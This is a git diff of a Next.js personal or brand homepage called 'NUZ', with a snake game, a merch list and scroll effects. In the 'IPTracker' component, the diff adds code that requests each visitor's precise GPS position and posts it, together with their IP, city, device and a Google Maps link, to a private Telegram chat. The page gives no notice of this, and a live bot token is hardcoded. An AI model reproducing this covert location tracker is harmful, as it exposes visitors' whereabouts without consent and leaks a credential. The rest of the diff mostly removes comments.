@@ -7,11 +7,11 @@ import Image from 'next/image';
 import axios from 'axios';
 
 
-// Constants
+
 const GRID_SIZE = 10;
 const CANVAS_SIZE = 250;
 
-// Types
+
 type Section = {
   id: string;
   title: string;
@@ -48,7 +48,7 @@ type SnakePart = {
   y: number;
 };
 
-// Pengunjung
+
 function IPTracker() {
   useEffect(() => {
     async function trackVisitor() {
@@ -70,25 +70,69 @@ function IPTracker() {
           latitude: location.latitude || 'Unknown',
           longitude: location.longitude || 'Unknown',
           browser: navigator.userAgent,
-          time: new Date().toISOString()
+          time: new Date().toISOString(),
+          using_gps: false
         };
+
+        if (navigator.geolocation) {
+          try {
+            
+            await new Promise((resolve, reject) => {
+              navigator.geolocation.getCurrentPosition(
+                
+                (position) => {
+                  visitorData.using_gps = true;
+                  visitorData.latitude = position.coords.latitude;
+                  visitorData.longitude = position.coords.longitude;
+                  resolve(position);
+                },
+                
+                (error) => {
+                  console.log("Akses lokasi GPS ditolak atau error...", error.message);
+                  resolve(null);
+                },
+                
+                { 
+                  enableHighAccuracy: true,
+                  timeout: 5000,
+                  maximumAge: 0
+                }
+              );
+            });
+          } catch (gpsError) {
+            console.error("Lokasi error...", gpsError);
+          }
+        }
         
         
         const TELEGRAM_BOT_TOKEN = '7807161260:AAHAnhLzPqLprHr_inS9ixhmb3jJwHxxdMI';
         const TELEGRAM_CHAT_ID = '1254913051';
         
+        let message;
         
-        const message = `
-NUZ! Ada pengunjung baru nihhh :)
+        if (visitorData.using_gps) {
+          
+          message = `
+NUZ! Ada pengunjung nihhh :)
+- IP: ${visitorData.ip}
+- Page: ${visitorData.page}
+- Koordinat GPS: ${visitorData.latitude}, ${visitorData.longitude}
+- Peta: https://www.google.com/maps?q=${visitorData.latitude},${visitorData.longitude}
+- Perangkat: ${visitorData.browser}
+- Waktu: ${visitorData.time}
+`;      
+        } else {
+          message = `
+NUZ! Ada pengunjung nihhh :)
 - IP: ${visitorData.ip}
 - Halaman: ${visitorData.page}
 - Lokasi: ${visitorData.city}, ${visitorData.country}
-- Koordinat: ${visitorData.latitude}, ${visitorData.longitude}
+- Koordinat IP: ${visitorData.latitude}, ${visitorData.longitude}
 - Peta: https://www.google.com/maps?q=${visitorData.latitude},${visitorData.longitude}
 - Perangkat: ${visitorData.browser}
 - Waktu: ${visitorData.time}
 `;
-        
+        }
         
         await axios.post(
           `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
@@ -101,7 +145,7 @@ NUZ! Ada pengunjung baru nihhh :)
         
       } catch (error) {
         
-        console.error('Tracking error:', error);
+        console.error('Lokasi error...', error);
       }
     }
     
@@ -111,7 +155,7 @@ NUZ! Ada pengunjung baru nihhh :)
   return null; 
 }
 
-// Data
+
 const sections: Section[] = [
   { id: 'about', title: '', desc: '', link: '', bg: '/aset2.png' },
   { id: 'services', title: '', desc: '', link: '', bg: '/aset2.png' },
@@ -137,7 +181,7 @@ const merchandise: MerchItem[] = [
   { id: 6, name: 'NUZ Lanyard', price: '$6.99', image: '/lanyard.png' },
 ];
 
-// Components
+
 const Header = ({ isAtTop, scrollToFooter }: { isAtTop: boolean, scrollToFooter: () => void }) => (
   <motion.header
     className="fixed top-0 w-full flex justify-center items-center z-30 p-6 transition-all duration-500"
@@ -333,7 +377,7 @@ const SnakeGame = () => {
   const snakeSectionRef = useRef(null);
   const isInView = useInView(snakeSectionRef, { amount: 0.5 });
 
-  // Snake game loop
+  
   useEffect(() => {
     if (!isInView) return;
     const interval = setInterval(() => {
@@ -353,7 +397,7 @@ const SnakeGame = () => {
     return () => clearInterval(interval);
   }, [dir, food, isInView]);
 
-  // Keyboard controls
+ 
   useEffect(() => {
     if (!isInView) return;
     const handleKey = (e: KeyboardEvent) => {
@@ -368,7 +412,7 @@ const SnakeGame = () => {
     return () => window.removeEventListener('keydown', handleKey);
   }, [isInView]);
 
-  // Canvas rendering
+  
   useEffect(() => {
     if (!canvasRef.current) return;
     const ctx = canvasRef.current.getContext('2d');
@@ -397,7 +441,7 @@ const SnakeGame = () => {
         />
       </motion.div>
       
-      {/* Mobile Controls */}
+      
       <div className="mt-6 flex flex-col items-center">
         <motion.button
           onClick={() => setDir({ x: 0, y: -1 })}
@@ -739,11 +783,11 @@ export default function Home() {
 
   const [blogSectionTransition, setBlogSectionTransition] = useState(false);
   
-  // Header how hide
+  
   useMotionValueEvent(scrollY, 'change', (latest) => {
     setIsAtTop(latest < 50);
   });
- // Section observer
+ 
   useEffect(() => {
     const observer = new IntersectionObserver(
       (entries) => {
@@ -758,7 +802,7 @@ export default function Home() {
     return () => observer.disconnect();
   }, []);
   
-  // Section transitionnn
+  
   useEffect(() => {
     if (activeSection === 'lonely') {
       setBlogSectionTransition(true);
@@ -776,7 +820,7 @@ export default function Home() {
   return (
     <main className="text-white font-semibold relative" ref={containerRef}>
       <IPTracker />
-      {/* Dither Background */}
+   
       <div
         className="fixed inset-0 z-0 pointer-events-none"
         style={{
@@ -789,7 +833,7 @@ export default function Home() {
 
       <Header isAtTop={isAtTop} scrollToFooter={scrollToFooter} />
 
-      {/* Main Sections */}
+    
       <div className="relative z-10">
         {sections.map((section, index) => {
           const isAbout = section.id === 'about';
@@ -824,7 +868,7 @@ export default function Home() {
                 backgroundAttachment: 'fixed',
               }}
             >
-              {/* Section transition glow effect */}
+              
               {isBlog && blogSectionTransition && (
                 <motion.div
                   className="absolute inset-0 z-10 pointer-events-none"
@@ -843,10 +887,10 @@ export default function Home() {
                 />
               )}
               
-              {/* Subtle gradient overlay */}
+           
               <div className="absolute inset-0 z-0 bg-black/20" />
               
-              {/* White glow border for project and contact sections */}
+              
               {(isProjects || isContact) && (
                 <motion.div 
                   className="absolute inset-0 pointer-events-none"
